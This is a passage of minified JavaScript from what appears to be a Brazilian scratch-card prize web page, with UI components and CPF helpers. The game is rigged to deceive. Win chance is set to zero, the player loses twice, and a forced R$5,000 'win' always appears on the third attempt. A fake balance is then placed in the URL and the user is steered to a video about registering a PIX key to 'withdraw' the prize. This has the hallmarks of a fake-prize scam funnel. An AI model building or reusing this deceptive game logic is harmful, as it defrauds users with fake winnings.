(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
  [913], {
    285: (e, t, a) => {
      "use strict";
      a.d(t, {
        $: () => o,
        r: () => i
      });
      var r = a(5155);
      a(2115);
      var s = a(9708),
        l = a(2085),
        n = a(9434);
      let i = (0, l.F)(
        "inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg:not([class*='size-'])]:size-4 shrink-0 [&_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive", {
          variants: {
            variant: {
              default: "bg-primary text-primary-foreground shadow-xs hover:bg-primary/90",
              destructive: "bg-destructive text-white shadow-xs hover:bg-destructive/90 focus-visible:ring-destructive/20 dark:focus-visible:ring-destructive/40 dark:bg-destructive/60",
              outline: "border bg-background shadow-xs hover:bg-accent hover:text-accent-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50",
              secondary: "bg-secondary text-secondary-foreground shadow-xs hover:bg-secondary/80",
              ghost: "hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50",
              link: "text-primary underline-offset-4 hover:underline"
            },
            size: {
              default: "h-9 px-4 py-2 has-[>svg]:px-3",
              sm: "h-8 rounded-md gap-1.5 px-3 has-[>svg]:px-2.5",
              lg: "h-10 rounded-md px-6 has-[>svg]:px-4",
              icon: "size-9"
            }
          },
          defaultVariants: {
            variant: "default",
            size: "default"
          }
        });

      function o(e) {
        let {
          className: t,
          variant: a,
          size: l,
          asChild: o = !1,
          ...c
        } = e, u = o ? s.DX : "button";
        return (0, r.jsx)(u, {
          "data-slot": "button",
          className: (0, n.cn)(i({
            variant: a,
            size: l,
            className: t
          })),
          ...c
        })
      }
    },
    1764: (e, t, a) => {
      Promise.resolve().then(a.bind(a, 1856))
    },
    1856: (e, t, a) => {
      "use strict";
      a.r(t), a.d(t, {
        default: () => O
      });
      var r = a(5155),
        s = a(2115),
        l = a(5695),
        n = a(6325),
        i = a(9911),
        o = a(5562),
        c = a(6766);
      let u = [{
        value: "R$1,00",
        imageSrc: "/jogo/images/R$1,00.webp"
      }, {
        value: "R$2,00",
        imageSrc: "/jogo/images/R$2,00.webp"
      }, {
        value: "R$5,00",
        imageSrc: "/jogo/images/R$5,00.webp"
      }, {
        value: "R$10,00",
        imageSrc: "/jogo/images/R$10,00.webp"
      }, {
        value: "R$20,00",
        imageSrc: "/jogo/images/R$20,00.webp"
      }, {
        value: "R$50,00",
        imageSrc: "/jogo/images/R$50,00.webp"
      }, {
        value: "R$100,00",
        imageSrc: "/jogo/images/R$100,00.webp"
      }, {
        value: "R$200,00",
        imageSrc: "/jogo/images/R$200,00.webp"
      }, {
        value: "R$500,00",
        imageSrc: "/jogo/images/R$500,00.webp"
      }, {
        value: "R$800,00",
        imageSrc: "/jogo/images/R$800,00.webp"
      }, {
        value: "R$1.000,00",
        imageSrc: "/jogo/images/R$1.webp"
      }, {
        value: "R$5.000,00",
        imageSrc: "/jogo/images/R5.webp"
      }, {
        value: "R$10.000,00",
        imageSrc: "/jogo/images/R$1.webp"
      }, {
        value: "R$15.000,00",
        imageSrc: "/jogo/images/R$15.webp"
      }];
      var d = a(4439),
        m = a(9434);

      function h(e) {
        let {
          className: t,
          children: a,
          ...s
        } = e;
        return (0, r.jsxs)(d.bL, {
          "data-slot": "scroll-area",
          className: (0, m.cn)("relative", t),
          ...s,
          children: [(0, r.jsx)(d.LM, {
            "data-slot": "scroll-area-viewport",
            className: "focus-visible:ring-ring/50 size-full rounded-[inherit] transition-[color,box-shadow] outline-none focus-visible:ring-[3px] focus-visible:outline-1",
            children: a
          }), (0, r.jsx)(x, {}), (0, r.jsx)(d.OK, {})]
        })
      }

      function x(e) {
        let {
          className: t,
          orientation: a = "vertical",
          ...s
        } = e;
        return (0, r.jsx)(d.VM, {
          "data-slot": "scroll-area-scrollbar",
          orientation: a,
          className: (0, m.cn)(
            "flex touch-none p-px transition-colors select-none",
            "vertical" === a &&
            "h-full w-2.5 border-l border-l-transparent",
            "horizontal" === a &&
            "h-2.5 flex-col border-t border-t-transparent", t),
          ...s,
          children: (0, r.jsx)(d.lr, {
            "data-slot": "scroll-area-thumb",
            className: "relative flex-1 rounded-full"
          })
        })
      }

      function f(e) {
        let {
          value: t,
          imageSrc: a
        } = e;
        return (0, r.jsx)("div", {
          className: "flex flex-col items-center flex-shrink-0 w-full max-w-[85px] mx-auto",
          children: (0, r.jsxs)("div", {
            className: "w-full aspect-square bg-[#045CA8] border-2 border-[#6097CA] rounded-lg p-0.5 flex flex-col items-center justify-between",
            children: [(0, r.jsx)("div", {
              className: "w-full flex-1 flex items-center justify-center",
              children: (0, r.jsx)("img", {
                src: a,
                alt: "Prêmio ".concat(t),
                width: 160,
                height: 160,
                className: "size-9 object-contain"
              })
            }), (0, r.jsx)("span", {
              className: "text-xs font-bold text-white text-center leading-tight",
              children: t
            })]
          })
        })
      }

      function p() {
        return (0, r.jsx)("div", {
          className: "w-full bg-[#DEE9FB] rounded-lg p-4",
          children: (0, r.jsxs)(h, {
            className: "w-full h-[240px]",
            children: [(0, r.jsx)("div", {
              className: "grid grid-cols-3 gap-1 pr-4",
              children: u.map(e => (0, r.jsx)("div", {
                children: (0, r.jsx)(f, {
                  value: e.value,
                  imageSrc: e.imageSrc
                })
              }, e.value))
            }), (0, r.jsx)(x, {
              orientation: "vertical",
              forceMount: !0,
              className: "opacity-100 [&>[data-slot=scroll-area-thumb]]:bg-[#FD9E4D] [&>[data-slot=scroll-area-thumb]]:hover:bg-[#FD8E3D]"
            })]
          })
        })
      }
      var g = a(5690),
        v = a(3904);

      function b(e) {
        let t = arguments.length > 1 && void 0 !== arguments[1] ?
          arguments[1] : {},
          a = (0, s.useRef)(null),
          {
            volume: r = 1,
            loop: l = !1,
            playbackRate: n = 1
          } = t;
        (0, s.useEffect)(() => {
          let t = new Audio(e);
          return t.volume = r, t.loop = l, t.playbackRate = n, a
            .current = t, () => {
              a.current && (a.current.pause(), a.current = null)
            }
        }, [e, r, l, n]);
        let i = (0, s.useCallback)(() => {
            if (a.current) {
              a.current.currentTime = 0;
              let e = a.current.play();
              void 0 !== e && e.catch(e => {
                console.warn("Erro ao reproduzir \xe1udio:", e)
              })
            }
          }, []),
          o = (0, s.useCallback)(() => {
            a.current && (a.current.pause(), a.current.currentTime = 0)
          }, []);
        return {
          play: i,
          stop: o,
          pause: (0, s.useCallback)(() => {
            a.current && a.current.pause()
          }, []),
          setVolume: (0, s.useCallback)(e => {
            a.current && (a.current.volume = Math.max(0, Math.min(1,
              e)))
          }, [])
        }
      }
      var w = a(1462),
        j = a(285);

      function N(e) {
        let {
          ...t
        } = e;
        return (0, r.jsx)(w.bL, {
          "data-slot": "alert-dialog",
          ...t
        })
      }

      function y(e) {
        let {
          ...t
        } = e;
        return (0, r.jsx)(w.ZL, {
          "data-slot": "alert-dialog-portal",
          ...t
        })
      }

      function S(e) {
        let {
          className: t,
          ...a
        } = e;
        return (0, r.jsx)(w.hJ, {
          "data-slot": "alert-dialog-overlay",
          className: (0, m.cn)(
            "data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 fixed inset-0 z-50 bg-black/50",
            t),
          ...a
        })
      }

      function R(e) {
        let {
          className: t,
          ...a
        } = e;
        return (0, r.jsxs)(y, {
          children: [(0, r.jsx)(S, {}), (0, r.jsx)(w.UC, {
            "data-slot": "alert-dialog-content",
            className: (0, m.cn)(
              "bg-background data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 fixed top-[50%] left-[50%] z-50 grid w-full max-w-[calc(100%-2rem)] translate-x-[-50%] translate-y-[-50%] gap-4 rounded-lg border p-6 shadow-lg duration-200 sm:max-w-lg",
              t),
            ...a
          })]
        })
      }

      function k(e) {
        let {
          className: t,
          ...a
        } = e;
        return (0, r.jsx)("div", {
          "data-slot": "alert-dialog-header",
          className: (0, m.cn)(
            "flex flex-col gap-2 text-center sm:text-left", t),
          ...a
        })
      }

      function $(e) {
        let {
          className: t,
          ...a
        } = e;
        return (0, r.jsx)(w.hE, {
          "data-slot": "alert-dialog-title",
          className: (0, m.cn)("text-lg font-semibold", t),
          ...a
        })
      }

      function C(e) {
        let {
          className: t,
          ...a
        } = e;
        return (0, r.jsx)(w.VY, {
          "data-slot": "alert-dialog-description",
          className: (0, m.cn)("text-muted-foreground text-sm", t),
          ...a
        })
      }

      function A(e) {
        let {
          className: t,
          ...a
        } = e;
        return (0, r.jsx)(w.rc, {
          className: (0, m.cn)((0, j.r)(), t),
          ...a
        })
      }
      let z = (0, s.memo)((0, s.forwardRef)((e, t) => {
        let {
          userName: a,
          onNoMoreAttempts: n,
          onAttemptsChange: i,
          onTryAgain: o,
          searchParams: u
        } = e, d = (0, l.useRouter)(), [h, x] = (0, s.useState)(3),
          [f, p] = (0, s.useState)(!1), [w, j] = (0, s.useState)(!
          1), [y, S] = (0, s.useState)(""), [z, M] = (0, s.useState)
          (""), E = (0, s.useRef)(!1), F = b("sounds/win.mp3", {
            volume: .7
          });
        (0, s.useEffect)(() => {
          f || (E.current = !1)
        }, [f]), (0, s.useImperativeHandle)(t, () => ({
          playAttempt: (e, t, a, r) => {
            void 0 !== a && x(a), e ? (j(!0), S(t || ""), M(
              r || ""), p(!0), setTimeout(() => {
              !E.current && F && F.play && (F.play(), E
                .current = !0)
            }, 150)) : (j(!1), M(""), p(!0))
          },
          reset: () => {
            x(3), p(!1), j(!1), S(""), M("")
          }
        }));
        let P = (0, s.useMemo)(() => y ? y.replace(/[R$\.\s]/g, "")
            .replace(",", ".") : null, [y]),
          D = (0, s.useCallback)(() => {
            if (w) {
              p(!1);
              let e = new URLSearchParams((null == u ? void 0 : u
                .toString()) || "");
              P && e.set("balance", P);
              let t = "/video?".concat(e.toString());
              d.push(t)
            } else {
              let e = h - 1;
              x(e), null == i || i(e), p(!1), 0 === e ? null ==
                n || n() : null == o || o()
            }
          }, [w, P, u, d, h, i, n, o]);
        return (0, r.jsx)(N, {
          open: f,
          onOpenChange: p,
          children: (0, r.jsxs)(R, {
            className: "w-full p-6 text-center space-y-4 rounded-2xl",
            children: [(0, r.jsx)(k, {
              className: "space-y-3",
              children: w && z ? (0, r.jsxs)(r
                .Fragment, {
                  children: [(0, r.jsxs)($, {
                    className: "font-bold text-[#045CA8] text-2xl sm:text-3xl",
                    children: ["Parab\xe9ns ",
                      a, "!"
                    ]
                  }), (0, r.jsx)(C, {
                    className: "text-base text-black",
                    children: "Voc\xea ganhou:"
                  }), (0, r.jsx)("div", {
                    className: "flex justify-center",
                      children: (0, r.jsx)(
                        "div", {
                          className: "relative w-36 h-36 sm:w-44 sm:h-44 flex items-center justify-center",
                          children: (0, r.jsx)(
                            "img", {
                              src: z || "/jogo/images/R5.webp",
                              alt: "Prêmio ".concat(y),
                              width: 176,
                              height: 176,
                              className: "object-contain drop-shadow-lg w-full h-full",
                              onError: function(e) { e.target.src = "/jogo/images/R5.webp"; }
                            }
                          )
                        })
                  }), (0, r.jsx)("div", {
                    className: "text-4xl sm:text-5xl font-bold text-[#00C853] text-center",
                    children: y
                  }), (0, r.jsxs)("p", {
                    className: "text-sm text-gray-700",
                    children: [
                      "Veja o v\xeddeo de 2 minutos, com um passo a passo explicativo para voc\xea aprender cadastrar sua chave ",
                      (0, r.jsx)("strong", {
                        children: "PIX"
                      }),
                      " e realizar o seu primeiro saque!"
                    ]
                  })]
                }) : (0, r.jsxs)(r.Fragment, {
                children: [(0, r.jsx)("div", {
                  className: "flex justify-center",
                  children: w ? (0, r.jsx)(c
                    .default, {
                      src: "/wrapped-present_1f381.png",
                      alt: "Presente",
                      width: 80,
                      height: 80,
                      className: "drop-shadow-lg"
                    }) : (0, r.jsx)("img", {
                      src: "images/face.webp",
                      alt: "Emoji chorando",
                      width: 80,
                      height: 80,
                      className: "drop-shadow-lg"
                    })
                }), (0, r.jsx)($, {
                  className: (0, m.cn)(
                    "font-bold text-[#045CA8]",
                    "text-xl"),
                  children: w ?
                    "Parab\xe9ns ".concat(a,
                      "!") :
                    "N\xe3o foi dessa vez."
                }), (0, r.jsx)("div", {
                  className: "space-y-3",
                  children: w ? (0, r.jsxs)(
                    "div", {
                      className: "space-y-2",
                      children: [(0, r
                        .jsx)(C, {
                        className: "text-base text-gray-700",
                        children: "Voc\xea ganhou:"
                      }), (0, r.jsx)(
                        "div", {
                          className: "text-4xl font-bold text-[#00C853] text-center",
                          children: y
                        })]
                    }) : (0, r.jsx)(C, {
                    className: "text-xl font-medium text-gray-700",
                    children: "Foi por quase! Tente novamente gerando outra raspadinha."
                  })
                })]
              })
            }), (0, r.jsx)(A, {
              onClick: D,
              className: (0, m.cn)(
                "w-full font-bold text-base py-6 rounded-lg flex items-center justify-center gap-2",
                w ?
                "bg-[#29A745] hover:bg-[#228B3C]" :
                "bg-[#045CA8] hover:bg-[#034A8E]"),
              children: w ? (0, r.jsxs)(r.Fragment, {
                children: ["Assistir v\xeddeo", (
                  0, r.jsx)(g.A, {
                  className: "size-5"
                })]
              }) : (0, r.jsxs)(r.Fragment, {
                children: [(0, r.jsx)(v.A, {
                  className: "size-5"
                }), "Jogar Novamente"]
              })
            })]
          })
        })
      }));
      z.displayName = "GameAlertContent";
      let M = (0, s.memo)((0, s.forwardRef)((e, t) => {
        let a = (0, l.useSearchParams)();
        return (0, r.jsx)(z, {
          ...e,
          ref: t,
          searchParams: a
        })
      }));
      M.displayName = "GameAlertWithSearchParams";
      let E = (0, s.memo)((0, s.forwardRef)((e, t) => (0, r.jsx)(s
        .Suspense, {
          fallback: null,
          children: (0, r.jsx)(M, {
            ...e,
            ref: t
          })
        })));
      E.displayName = "GameAlert";
      var F = a(295);
      let P = (e, t, a, r) => {
          if (t || Math.random() < r) {
            let t = a ? e.find(e => e.value === a) || e[0] : e[Math.floor(
                Math.random() * e.length)],
              r = [, , , ].fill(null).map((e, a) => ({
                id: a,
                value: t.value,
                icon: t.imageSrc
              })),
              s = e.filter(e => e.value !== t.value),
              l = [],
              n = new Map,
              i = s.map((e, t) => t);
            for (let e = 3; e < 9; e++) {
              let t, a = 0;
              do t = s[i[Math.floor(Math.random() * i.length)]],
              a++; while ((n.get(t.value) || 0) >= 2 && a < 20);
              n.set(t.value, (n.get(t.value) || 0) + 1), l.push({
                id: e,
                value: t.value,
                icon: t.imageSrc
              })
            }
            return [...r, ...l].sort(() => Math.random() - .5)
          } {
            let t = [],
              a = new Map,
              r = e.map((e, t) => t);
            for (let s = 0; s < 9; s++) {
              let l, n = 0;
              do l = e[r[Math.floor(Math.random() * r.length)]],
              n++; while ((a.get(l.value) || 0) >= 2 && n < 20);
              a.set(l.value, (a.get(l.value) || 0) + 1), t.push({
                id: s,
                value: l.value,
                icon: l.imageSrc
              })
            }
            return t
          }
        },
        D = (0, s.memo)(function(e) {
          let {
            onComplete: t,
            prizes: a,
            winChance: l = .3,
            forceWin: n = !1,
            forcedPrize: o,
            hasStarted: u = !1,
            onStart: d
          } = e, [h, x] = (0, s.useState)(u), [f, p] = (0, s.useState)(!
            1), [g, v] = (0, s.useState)([]), [w, j] = (0, s.useState)(!
            1), [N, y] = (0, s.useState)(window.innerWidth), [S, R] = (
            0, s.useState)(320), k = (0, s.useRef)(null), $ = (0, s
            .useRef)(null), C = (0, s.useRef)(!1), A = function(e) {
            let [t, a] = s.useState(!1);
            return s.useEffect(() => {
              function t(e) {
                a(e.matches)
              }
              let r = matchMedia(e);
              return r.addEventListener("change", t), a(r
                .matches), () => r.removeEventListener("change",
                  t)
            }, [e]), t
          }("(max-width: 420px)"), z = b("sounds/scratch.mp3", {
            volume: .5,
            loop: !0
          }), M = (0, s.useMemo)(() => P(a, n, o, l), [a, n, o, l]);
          (0, s.useEffect)(() => {
            v(M), j(!1), u ? x(!0) : x(!1), p(!1)
          }, [M, u]), (0, s.useEffect)(() => {
            if (!k.current) return;
            R(k.current.offsetWidth), y(window.innerWidth);
            let e = new ResizeObserver(e => {
                for (let t of e) R(t.contentRect.width)
              }),
              t = () => {
                y(window.innerWidth)
              };
            return e.observe(k.current), window.addEventListener(
              "resize", t), () => {
              e.disconnect(), window.removeEventListener("resize",
                t)
            }
          }, []);
          let E = (0, s.useCallback)(() => {
              let e = {};
              for (let [t, a] of(g.forEach(t => {
                  e[t.value] = (e[t.value] || 0) + 1
                }), Object.entries(e)))
                if (a >= 3) return {
                  hasWon: !0,
                  prizeValue: t
                };
              return {
                hasWon: !1
              }
            }, [g]),
            D = (0, s.useCallback)(() => {
              if (w) return;
              j(!0), z.stop();
              let e = E();
              setTimeout(() => {
                t(e.hasWon, e.prizeValue)
              }, 2e3)
            }, [w, E, t, z]),
            _ = (0, s.useCallback)(e => {
              let t = e.touches[0];
              t && ($.current = {
                x: t.clientX,
                y: t.clientY
              }, C.current = !1, w || z.play())
            }, [w, z]),
            L = (0, s.useCallback)(e => {
              if ($.current && e.touches[0]) {
                let t = Math.abs(e.touches[0].clientX - $.current.x);
                t > Math.abs(e.touches[0].clientY - $.current.y) &&
                  t > 10 ? (C.current = !0, e.preventDefault(), e
                    .stopPropagation()) : C.current && (e
                    .preventDefault(), e.stopPropagation())
              }
            }, []),
            W = (0, s.useCallback)(() => {
              $.current = null, C.current = !1, z.pause()
            }, [z]),
            T = (0, s.useCallback)(() => {
              w || z.play()
            }, [w, z]),
            O = (0, s.useCallback)(() => {
              z.pause()
            }, [z]),
            I = (0, s.useCallback)(() => {
              z.pause()
            }, [z]),
            B = (0, s.useMemo)(() => A ? N >= 390 && N < 420 ? 295 : N <
              640 ? 260 : N < 1024 ? 340 : 380 : S > 0 ? S : N < 640 ?
              280 : N < 1024 ? 360 : 400, [N, A, S]),
            V = (0, s.useMemo)(() => Math.min(S, B), [S, B]),
            q = (0, s.useMemo)(() => N < 640 ? 20 : N < 1024 ? 18 : 16,
              [N]);
          return 0 === g.length ? (0, r.jsx)("div", {
            className: "w-full aspect-square bg-gradient-to-br from-[#045CA8]/20 to-[#0654A0]/20 rounded-lg"
          }) : h ? (0, r.jsxs)("div", {
            ref: k,
            className: "w-full space-y-4",
            style: {
              maxWidth: "".concat(B, "px"),
              margin: "0 auto"
            },
            children: [(0, r.jsx)("div", {
              className: "w-full aspect-square relative overflow-hidden rounded-lg shadow-lg",
              style: {
                touchAction: "none",
                userSelect: "none"
              },
              onTouchStart: _,
              onTouchMove: L,
              onTouchEnd: W,
              onMouseDown: T,
              onMouseUp: O,
              onMouseLeave: I,
              children: V > 0 && (0, r.jsx)(F.A, {
                width: V,
                height: V,
                image: "images/raspe_aqui.webp",
                finishPercent: 50,
                brushSize: q,
                onComplete: D,
                children: (0, r.jsx)("div", {
                  className: "w-full h-full bg-gradient-to-br from-[#045CA8] to-[#0654A0] p-3 sm:p-4",
                  children: (0, r.jsx)("div", {
                    className: "grid grid-cols-3 gap-2 sm:gap-3 h-full",
                    children: g.map(e => (0, r
                      .jsxs)("div", {
                      className: "bg-white/10 backdrop-blur-sm rounded-lg flex flex-col items-center justify-center p-1.5 sm:p-2 border border-white/20",
                      children: [(0, r.jsx)(
                        "div", {
                          className: "relative w-10 h-10 sm:w-14 sm:h-14 mb-1 sm:mb-2 flex items-center justify-center",
                          children: (0, r.jsx)(
                            "img", {
                              src: e.icon,
                              alt: "Prêmio ".concat(e.value),
                              width: 56,
                              height: 56,
                              className: "object-contain drop-shadow-lg w-full h-full",
                              onError: function(ev) { ev.target.src = "images/R5.webp"; }
                            }
                          )
                        }), (0, r.jsx)(
                        "p", {
                          className: "text-white text-xs font-bold text-center drop-shadow-md",
                          children: e
                            .value
                        })]
                    }, e.id))
                  })
                })
              })
            }), (0, r.jsxs)("button", {
              disabled: !0,
              className: "w-full bg-[#F3920B] opacity-75 text-white font-bold mt-4 py-4 px-6 rounded-lg shadow-lg flex items-center justify-center gap-3 cursor-default",
              children: [(0, r.jsx)(i.OjF, {
                className: "w-6 h-6 text-white"
              }), "Raspe a cartela!"]
            })]
          }) : (0, r.jsxs)("div", {
            ref: k,
            className: "w-full space-y-4",
            style: {
              maxWidth: "".concat(B, "px"),
              margin: "0 auto"
            },
            children: [(0, r.jsx)("div", {
              className: (0, m.cn)(
                "w-full aspect-square relative overflow-hidden rounded-lg shadow-lg",
                f ? "opacity-50 cursor-not-allowed" : "cursor-pointer hover:shadow-xl transition-all duration-200"
              ),
              onClick: f ? void 0 : () => {
                p(!0), null == d || d(), setTimeout(() => {
                  x(!0), p(!1)
                }, 500)
              },
              children: (0, r.jsx)("img", {
                src: "images/preview.webp",
                alt: "Jogar agora",
                className: "object-cover w-full h-full"
              })
            }), (0, r.jsx)("button", {
              onClick: () => {
                p(!0), null == d || d(), setTimeout(() => {
                  x(!0), p(!1)
                }, 500)
              },
              disabled: f,
              className: (0, m.cn)(
                "w-full bg-[#F3920B] text-white font-bold py-4 px-6 rounded-lg shadow-lg transition-all duration-200",
                f ? "opacity-50 cursor-not-allowed" :
                "hover:shadow-xl active:scale-95"),
              children: f ? "Carregando..." : "Jogar agora"
            })]
          })
        });
      var _ = a(4145),
        L = a(6929);

      function W() {
        let e = (0, l.useSearchParams)();
        return (0, r.jsx)(T, {
          searchParams: e
        })
      }

      function T(e) {
        let {
          searchParams: t
        } = e, {
          firstName: n,
          isEmpty: d,
          isLoading: m
        } = (0, L.B)(), h = (0, l.useRouter)(), x = null == t ? void 0 : t
          .toString(), f = (0, s.useRef)(null), [g, v] = (0, s.useState)(
            3), [b, w] = (0, s.useState)(!1);
        (0, s.useEffect)(() => {
          !m && d && h.push("/inicio".concat(x ? "?".concat(x) : ""))
        }, [d, m, x, h]);
        let j = null == t ? void 0 : t.get("balance"),
          N = j ? parseFloat(j) : 0,
          [y, S] = (0, s.useState)(0),
          [R, k] = (0, s.useState)(!1),
          [$, C] = (0, s.useState)({
            width: 0,
            height: 0
          }),
          [A, z] = (0, s.useState)(null),
          M = (0, s.useMemo)(() => 1 === g ? "R$5.000,00" : void 0, [g]);
        (0, s.useEffect)(() => {
          b && (C({
            width: window.innerWidth,
            height: window.innerHeight
          }), A || a.e(948).then(a.bind(a, 3186)).then(e => {
            z(() => e.default)
          }))
        }, [b, A]);
        let F = (0, s.useCallback)(() => {
            var e, a;
            let r = 1 === g,
              s = 1 === g ? "R$5.000,00" : void 0;
            if (r && s) {
              w(!0), setTimeout(() => w(!1), 5e3);
              let a = N + parseFloat(s.replace("R$", "").replace(".",
                  "").replace(",", ".")),
                l = new URLSearchParams((null == t ? void 0 : t
                  .toString()) || "");
              l.set("balance", a.toString());
              try {
                // update URL query without triggering Next full navigation / reload
                var _url = "/jogo?".concat(l.toString());
                if (window && window.history && window.history.replaceState) {
                  window.history.replaceState(window.history.state, "", _url);
                } else if (h && h.replace) {
                  // fallback to router.replace if history API is not available
                  h.replace(_url, {
                    scroll: !1
                  });
                }
              } catch (err) {
                // fallback: use router.replace if anything goes wrong
                h.replace("/jogo?".concat(l.toString()), {
                  scroll: !1
                });
              }
              let n = u.find(e => e.value === s),
                i = (null == n ? void 0 : n.imageSrc) || "";
              null == (e = f.current) || e.playAttempt(r, s, g, i)
            } else null == (a = f.current) || a.playAttempt(r, s, g)
          }, [g, t, h, N]),
          P = (0, s.useCallback)(() => {
            S(e => e + 1)
          }, []);
        return (0, r.jsxs)(r.Fragment, {
          children: [b && $.width > 0 && A && (0, r.jsx)("div", {
            className: "fixed inset-0 z-[9999] pointer-events-none",
            children: (0, r.jsx)(A, {
              width: $.width,
              height: $.height,
              recycle: !1,
              numberOfPieces: $.width < 640 ? 150 : 200,
              gravity: .3
            })
          }), (0, r.jsxs)(o.Zp, {
            className: "max-w-md w-full rounded-3xl shadow-lg p-6 space-y-4",
            children: [(0, r.jsxs)("div", {
              className: "text-center",
              children: [(0, r.jsxs)("div", {
                className: "flex items-center justify-center gap-2 mb-2",
                children: [(0, r.jsx)("img", {
                  src: "images/logo-2.webp",
                  width: 100,
                  height: 100,
                  alt: "",
                  className: "w-6"
                }), (0, r.jsx)("h2", {
                  className: "text-[#045CA8] font-bold text-xl",
                  children: "Sua Raspadinha"
                })]
              }), (0, r.jsxs)("p", {
                className: "text-gray-600 text-sm",
                children: ["Tentativas restantes: ",
                  (0, r.jsxs)("strong", {
                    children: [g, "/3"]
                  })
                ]
              })]
            }), (0, r.jsx)("div", {
              className: "flex items-center justify-center",
              children: g > 0 ? (0, r.jsx)(D, {
                onComplete: F,
                prizes: u,
                winChance: 0,
                forceWin: 1 === g,
                forcedPrize: M,
                hasStarted: R,
                onStart: () => k(!0)
              }, y) : (0, r.jsx)("div", {
                className: "bg-gray-400 rounded-2xl p-8 shadow-lg min-h-[260px] w-full flex items-center justify-center",
                children: (0, r.jsx)("p", {
                  className: "text-white font-bold text-xl text-center",
                  children: "Suas tentativas acabaram"
                })
              })
            }), (0, r.jsxs)(_.Z0, {
              variant: "default",
              className: "bg-[#E7F0FF]",
              icon: (0, r.jsx)(i.SBv, {
                className: "size-5.5 text-[#0C60AA]"
              }),
              children: [(0, r.jsx)(_.Hn, {
                className: "font-bold",
                children: "Retire 3 imagens iguais e conquiste seu pr\xeamio!"
              }), (0, r.jsx)(_.rb, {
                children: "O valor correspondente ser\xe1 creditado automaticamente na sua conta."
              })]
            }), (0, r.jsx)("h3", {
              className: "text-black font-bold text-lg text-left",
              children: "Pr\xeamios da Raspadinha:"
            }), (0, r.jsx)(p, {})]
          }), (0, r.jsx)(E, {
            ref: f,
            userName: n || "",
            onAttemptsChange: e => v(e),
            onTryAgain: P,
            onNoMoreAttempts: () => {
              console.log("Sem mais tentativas")
            }
          })]
        })
      }

      function O() {
        return (0, r.jsx)(s.Suspense, {
          fallback: (0, r.jsx)(n.a, {}),
          children: (0, r.jsx)(W, {})
        })
      }
    },
    1884: (e, t, a) => {
      "use strict";

      function r(e) {
        return e.replace(/\D/g, "").slice(0, 11).replace(
          /(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
      }

      function s(e) {
        let t = e.replace(/\D/g, "").slice(0, 11);
        return t.length > 9 ? t.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/,
            "$1.$2.$3-$4") : t.length > 6 ? t.replace(
            /(\d{3})(\d{3})(\d{1,3})/, "$1.$2.$3") : t.length > 3 ? t
          .replace(/(\d{3})(\d{1,3})/, "$1.$2") : t
      }

      function l(e) {
        return e.toLowerCase().split(" ").map(e => e.charAt(0)
          .toUpperCase() + e.slice(1)).join(" ")
      }

      function n(e) {
        let t = "string" == typeof e ? parseFloat(e.replace(/[^\d,]/g, "")
          .replace(",", ".")) || 0 : e;
        return new Intl.NumberFormat("pt-BR", {
          minimumFractionDigits: 2,
          maximumFractionDigits: 2
        }).format(t)
      }

      function i(e) {
        if (!e) throw Error();
        return e.replace(/\D/g, "")
      }

      function o(e) {
        let t = e.replace(/\D/g, "");
        if (11 !== t.length || /^(\d)\1{10}$/.test(t)) return !1;
        let a = 0;
        for (let e = 0; e < 9; e++) a += Number.parseInt(t.charAt(e)) * (
          10 - e);
        let r = 10 * a % 11;
        if ((10 === r || 11 === r) && (r = 0), r !== Number.parseInt(t
            .charAt(9))) return !1;
        a = 0;
        for (let e = 0; e < 10; e++) a += Number.parseInt(t.charAt(e)) * (
          11 - e);
        return (10 == (r = 10 * a % 11) || 11 === r) && (r = 0), r ===
          Number.parseInt(t.charAt(10))
      }
      a.d(t, {
        Or: () => o,
        Zm: () => i,
        bb: () => r,
        kR: () => l,
        kl: () => s,
        vv: () => n
      })
    },
    4145: (e, t, a) => {
      "use strict";
      a.d(t, {
        Hn: () => d,
        Z0: () => u,
        rb: () => m
      });
      var r = a(5155);
      a(2115);
      var s = a(1284),
        l = a(1243),
        n = a(3453),
        i = a(4861),
        o = a(9434);
      let c = {
        default: {
          container: "bg-gray-50",
          text: "text-gray-800",
          icon: (0, r.jsx)(s.A, {
            className: "size-5"
          })
        },
        warning: {
          container: "bg-yellow-50 border-l-4 border-orange-400",
          text: "text-[rgba(133,100,4,1)]",
          icon: (0, r.jsx)(l.A, {
            className: "size-5"
          })
        },
        success: {
          container: "bg-green-50 border-l-4 border-green-500",
          text: "text-green-800",
          icon: (0, r.jsx)(n.A, {
            className: "size-5"
          })
        },
        error: {
          container: "bg-red-50 border-l-4 border-red-500",
          text: "text-red-800",
          icon: (0, r.jsx)(i.A, {
            className: "size-5"
          })
        }
      };

      function u(e) {
        let {
          className: t,
          variant: a = "default",
          icon: s,
          children: l,
          ...n
        } = e, i = c[a];
        return (0, r.jsx)("div", {
          role: "alert",
          className: (0, o.cn)("p-3 rounded-r rounded-md", i
            .container, t),
          ...n,
          children: (0, r.jsxs)("div", {
            className: "flex gap-3 items-start",
            children: [(0, r.jsx)("div", {
              className: (0, o.cn)("shrink-0", i.text),
              children: s || i.icon
            }), (0, r.jsx)("div", {
              className: "flex-1",
              children: l
            })]
          })
        })
      }

      function d(e) {
        let {
          className: t,
          variant: a = "default",
          ...s
        } = e;
        return (0, r.jsx)("h4", {
          className: (0, o.cn)("text-base font-bold mb-1", c[a].text,
            t),
          ...s
        })
      }

      function m(e) {
        let {
          className: t,
          variant: a = "default",
          ...s
        } = e;
        return (0, r.jsx)("p", {
          className: (0, o.cn)("text-sm leading-relaxed", c[a].text,
            t),
          ...s
        })
      }
    },
    5562: (e, t, a) => {
      "use strict";
      a.d(t, {
        Wu: () => i,
        ZB: () => n,
        Zp: () => l
      });
      var r = a(5155);
      a(2115);
      var s = a(9434);

      function l(e) {
        let {
          className: t,
